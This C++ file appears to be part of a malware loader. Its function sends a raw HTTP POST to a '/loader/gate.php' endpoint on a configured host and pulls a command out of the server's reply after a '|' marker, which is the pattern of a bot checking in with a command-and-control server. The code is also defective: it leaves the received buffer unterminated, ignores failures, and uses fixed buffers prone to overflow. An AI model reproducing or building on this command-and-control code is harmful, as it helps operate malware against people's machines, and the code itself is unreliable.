#include "common.h"

//version 2

// http parser by hex
std::string HttpParser(const char* rData)
{  
   //std::cout << "rData\t"<< rData <<std::endl;
   std::string stdCommend;
   char hex[5000];
   int  sParse=0;
   for(int x = 0; x < strlen(rData);x++)
   {

      sprintf(hex, "%x", rData[x]);

      if(strcmp(hex,"7c") == 0)
      {
         sParse = 1;
         x+=2;
      }

      if(sParse == 1)
         stdCommend+=rData[x];

   }

   return stdCommend;
}

// http send and recive
std::string httpSendRecive(const char*commend)
{
   WSADATA wsData;
   int     iResult;
   struct  addrinfo*result=NULL,*ptr=NULL,hints;
   SOCKET  connSocket = INVALID_SOCKET;

   ZeroMemory(&hints,sizeof hints);

   iResult = WSAStartup(MAKEWORD(2,2),&wsData);

   if(iResult  != 0)
   {
      printf("Error WSAStartup faild \n");
      //return -1;
   }

   iResult = getaddrinfo(HOST,PORT,&hints,&result);

   if(iResult  != 0)
   {
      printf("Error getaddrinfo faild \n");
      //return -1;
   }

   ptr = result;

   connSocket = socket(ptr->ai_family,ptr->ai_socktype,ptr->ai_protocol);
   if(connSocket == INVALID_SOCKET)
   {
      printf("Error socket faild \n");
      //return -1;
   }

   iResult = connect(connSocket,ptr->ai_addr,ptr->ai_addrlen);

   if(connSocket == SOCKET_ERROR)
   {
      printf("Error connSocket faild \n");
      //return -1;
   }


   // send section

    //data length
   int  commendLength = strlen(commend);
   char StringCommendLength[200];
   itoa(commendLength,StringCommendLength,10);

   char *sData;
   sData = (char*)malloc(5000);
   strcpy(sData,"POST /loader/gate.php HTTP/1.0\r\n");
   strcat(sData,"Host: ");
   strcat(sData,HOST);
   strcat(sData,"\r\n");
   strcat(sData,"Content-Type: text/html\r\n");
   strcat(sData,"Content-Length: ");
   strcat(sData,StringCommendLength);
   strcat(sData,"\r\n");
   strcat(sData,"Accept-Charset: utf-8\r\n");
   strcat(sData,"\r\n");
   strcat(sData,commend);
   strcat(sData,"\r\n");
   strcat(sData,"\r\n");

   iResult = send(connSocket,sData,strlen((const char*)sData),0);
   if(iResult == SOCKET_ERROR )
   {
      printf("Error send faild \n");
      //return -1;
   }



   // recive section
   char * rData;
   rData = (char*)malloc(500);
   iResult = recv(connSocket,(char *)rData,500,0);
   if(iResult == SOCKET_ERROR )
   {
      printf("Error recv faild \n");
      //return -1;
   }

   // parse http response
   return HttpParser(rData);
}
